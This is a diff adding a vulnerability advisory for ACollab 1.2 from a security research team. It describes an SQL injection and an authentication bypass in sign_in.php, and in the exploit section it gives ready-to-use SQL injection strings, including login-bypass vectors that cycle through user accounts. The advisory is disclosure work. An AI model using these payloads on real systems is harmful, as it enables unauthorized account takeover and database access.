@@ -1,0 +1,95 @@
+##########################www.BugReport.ir########################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title:		ACollab Multiple Vulnerabilities
+# Vendor:		http://www.atutor.ca/acollab
+# Vulnerable Version:	1.2 (Latest version till now)
+# Exploitation:		Remote with browser
+# Fix:					N/A
+###################################################################################
+
+####################
+- Description:
+####################
+
+ACollab as described by its vendor is an accessible, open source,  
+multi-group, Web-based collaborative
+work environment. ACollab is available as a standalone collaborative  
+work environment that will run on
+its own. ACollab is ideal for groups working at a distance developing  
+documentation, collaborating on
+research, or writing joint papers.
+
+
+####################
+- Vulnerability:
+####################
+
++--> SQL Injection
+	All of the parameters are sanitized correctly before being used in  
+SQL queries else of
+	the POST parameters 'login' and 'password' in the "sign_in.php" page.  
+These parameters
+	can be used for injecting arbitrary SQL queries; the 'login'  
+parameter is single quoted
+	and the 'password' parameter is single parenthesized, single quoted.
+
++--> Authentication Bypass
+	The ACollab CMS uses two mechanism for authentication. One for master  
+admin user which is
+	based on a hard coded username/password initialized in the  
+installation process. And a DB-based
+	authentication for all other users, including the group  
+administrators which can add/remove/edit
+	all posts and news and ... from forums and first screen of the  
+website. The second authentication
+	mechanism can be bypassed.
+
+####################
+- Exploits/PoCs:
+####################
+
++--> Exploiting The (MySQL) SQL Injection Vulnerability:
+	Go to the sign in page at "victim.net/ACollab/sign_in.php" and use  
+the following vectors for injecting
+	your desired SQL query, namely $Q:
+	  - In the Username field (login POST parameter): ' or $Q or ''='
+	  - In the Password field (password POST parameter): ') or $Q or (''='
+
++--> Exploiting The Authentication Bypass Vulnerability:
+	You can login as anyone of the registered users of ACollab CMS by  
+providing following vector
+	as username and nothing as password:
+	  'or''='' limit 1 offset 0 -- '
+	Above vector will log you as the first user according to its member  
+id order. You can login as other
+	users, searching for a group administrator account, by following vectors:
+	  'or''='' limit 1 offset 0 -- '
+	  'or''='' limit 1 offset 1 -- '
+	  'or''='' limit 1 offset 2 -- '
+	    ....
+
+####################
+- Solution:
+####################
+
+Add the following command
+     $_POST['login'] = addslashes ($_POST['login']);  
+$_POST['password'] = addslashes ($_POST['password']);
+at the line 46 of 'sign_in.php' file.
+
+####################
+- Original Advisory:
+####################
+
+http://www.bugreport.ir/index_72.htm
+
+####################
+- Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com
+
